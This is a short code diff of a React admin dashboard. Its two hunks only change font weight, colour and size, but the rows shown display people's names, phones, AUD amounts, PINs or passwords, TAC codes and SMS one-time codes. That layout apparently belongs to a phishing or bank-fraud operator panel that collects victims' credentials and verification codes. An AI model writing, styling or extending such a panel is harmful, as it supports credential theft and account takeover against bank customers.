@@ -850,7 +850,7 @@ export function AdminDashboardClean() {
                         <div className="font-bold text-white">{fd.firstName} {fd.lastName}</div>
                         <div className="text-[11px] text-zinc-500 font-mono">{fd.phone || "-"}</div>
                         {row.amount > 0 && (
-                        <div className="mt-1 inline-flex items-center rounded-md bg-blue-500/10 px-2 py-0.5 text-[10px] font-bold text-blue-500 border border-blue-500/20">
+                        <div className="mt-1 inline-flex items-center rounded-md bg-blue-500/10 px-2 py-0.5 text-[10px] font-semibold text-blue-400 border border-blue-500/20">
                           {row.amount} {(fd.currency as string) || "AUD$"}
                         </div>
                       )}
@@ -952,7 +952,7 @@ export function AdminDashboardClean() {
                         <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{fd.pin || fd.pw || "-"}</span></div>
                         <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{fd.tacCode || fd.tac_code || "-"}</span></div>
                       </td>
-                      <td className="px-4 py-4 font-mono font-bold text-orange-400 text-xl">{fd.smsCode || "-"}</td>
+                      <td className="px-4 py-4 font-mono font-bold text-orange-400 text-sm">{fd.smsCode || "-"}</td>
                       <td className="px-4 py-4 text-right">
                         <div className="flex flex-col gap-2 w-full min-w-[180px] items-end justify-end ml-auto">
                           <select 
